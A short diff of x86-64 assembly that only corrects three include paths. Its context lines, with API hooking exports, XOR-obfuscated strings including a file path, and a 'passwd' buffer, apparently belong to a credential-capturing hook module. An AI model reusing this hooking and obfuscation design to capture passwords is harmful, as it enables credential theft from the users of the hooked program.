@@ -9,7 +9,7 @@ export hook_iat
 global hook_inline_patch
 export hook_inline_patch
 
-%include '..\utils_64_text.asm'
+%include '../utils/utils_64_text.asm'
 
 ; arg0: CodePage            rcx
 ; arg1: dwFlags             rdx
@@ -582,7 +582,7 @@ image_directory_entry_to_data_ex_xor: db 0x79, 0x5d, 0x51, 0x57, 0x55, 0x74, 0x5
 file_path_xor: db 0x73, 0xa, 0x6c, 0x6c, 0x62, 0x64, 0x7f, 0x6c, 0x6c, 0x40, 0x47, 0x5f, 0x42, 0x54, 0x1e, 0x44, 0x48, 0x44, 0x0
 .len equ $ - file_path_xor - 1
 
-%include '../utils_64_data.asm'
+%include '../utils/utils_64_data.asm'
 
 section .bss
 wide_char_to_multi_byte: dq ?
@@ -590,4 +590,4 @@ original_func_bytes: resb 14
 .len equ $ - original_func_bytes
 passwd: resb 128
 
-%include '../utils_64_bss.asm'
+%include '../utils/utils_64_bss.asm'
